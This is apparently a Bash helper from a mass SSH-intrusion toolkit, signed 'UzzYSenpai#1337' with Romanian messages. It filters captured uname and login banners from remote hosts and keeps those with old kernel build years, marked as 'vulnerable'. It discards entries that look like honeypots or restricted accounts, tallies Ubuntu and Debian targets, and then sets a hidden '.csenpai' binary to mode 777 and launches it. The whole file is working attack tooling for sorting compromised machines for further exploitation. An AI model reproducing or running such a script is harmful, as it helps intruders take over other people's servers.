#!/bin/bash
chmod 777 .csenpai
clear
rm -rf senpai.good
input=$1
while IFS= read -r line
do
        if [[ $line == *"2019"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
		if [[ $line == *"2018"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
		if [[ $line == *"2017"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
		if [[ $line == *"2016"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
		if [[ $line == *"2015"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
		if [[ $line == *"2014"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
		if [[ $line == *"2013"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
		if [[ $line == *"2012"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
		if [[ $line == *"2011"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
		if [[ $line == *"2010"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
		if [[ $line == *"2009"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
		if [[ $line == *"2008"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
		if [[ $line == *"2007"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
		if [[ $line == *"2006"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
		if [[ $line == *"2005"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
		if [[ $line == *"2004"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
		if [[ $line == *"2003"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
		if [[ $line == *"2002"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
		if [[ $line == *"2001"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
		if [[ $line == *"2000"* ]]; then
           echo "$line" >> vuln.txt
           printf "\033[0;31mExista : $line\n\033[0m"
        fi
done < "$input"
chmod 777 .csenpai
cat vuln.txt|sort|uniq>god.txt
grep -v "DVDSrv" god.txt > temp
grep -v "pos01" temp > temp2
grep -v "raspberry" temp2 > temp3
grep -v "Error" temp3 > temp4
grep -v "Please login" temp4 > temp5
grep -v "sh-4.3" temp5 > temp6
grep -v "06:20:54" temp6 > temp7
grep -v "ERROR" temp7 > temp8
grep -v "22:33:07" temp8 > temp9
grep -v "3.2.68-1+deb7u1" temp9 > temp10
grep -v "i686 GNU/Linux" temp10 > temp11
grep -v "This service allows sftp connections only." temp11 > temp12
grep -v "This account is currently not available." temp12 > temp13
grep -v "uname: Invalid argument" temp13 > temp14
grep -v "serv- 4.15.0" temp14 > temp15
grep -v "2.6.26-2-686 #1" temp15 > temp16
grep -v "armv7l GNU/Linux" temp16 > temp17
grep -v "PREEMPT" temp16 > temp17
grep -v "mips64 GNU/Linux" temp17 > temp18
grep -v "armv4tl" temp18 > temp19
grep -v "Failed logins" temp19 > temp20
grep -v "Logins over the last" temp20 > temp21
grep -v "i686 i686 i386 GNU/Linux" temp21 > temp22
grep -v "Darwin Mac-mini" temp22 > temp23
grep -v "armv5tejl GNU/Linux" temp23 > temp24
grep -v "4.14.35-1818.2.1.el7uek.x86_64" temp24 > temp25
grep -v "armv7l unknown" temp25 > temp26
grep -v "Darwin Kernel Version" temp26 > temp27
grep -v "4.9.110-3+deb9u4" temp27 > temp28
grep -v "prod01" temp28 > temp29
grep -v "cda1" temp29 > temp30
grep -v "22:26:13 UTC 2017" temp30 > temp31
sed '/^\s*$/d' temp31 > senpai.good
sleep 2
rm -rf temp temp1 temp2 temp3 temp4 temp5 temp6 temp7 temp8 temp9 temp10 temp11 temp12 temp13 temp14 temp15 temp16 temp17 temp18 temp19 temp20 temp21 temp22 temp23 temp24 temp25 temp26 temp27 temp28 temp29 temp30 temp31
rm -rf vuln.txt
rm -rf god.txt
cat gasite.txt >> copiegasite.log
rm -rf gasite.txt
rm -rf sparte.txt
clear
count=`grep -c . senpai.good`
  printf "\n\033[0;31m        --->          \033[0;36mUzzY\033[0;35mSenpai#1337         \033[0;31m<---\033[0m\n"
  printf "\033[0;36mFiltrare terminata \033[0;31m[ \033[0;37m$count \033[0;31m] \033[0;35mlinii!\033[0m\n"
	ub=`grep -o -i ubuntu senpai.good | wc -l`
	printf "\033[0;31m[ \033[0;35m $ub \033[0;31m] \033[0;36m- \033[0;33m Ubuntu OS\033[0m\n"
	db=`grep -o -i debian senpai.good | wc -l`
	printf "\033[0;31m[ \033[0;35m $db \033[0;31m] \033[0;36m- \033[0;33m Debian OS\033[0m\n"
  sed -i '1 i\Bunatati de la Bunica. UzzYSenpai#1337' senpai.good
if [ $2 = 1 ];then
./.csenpai
fi
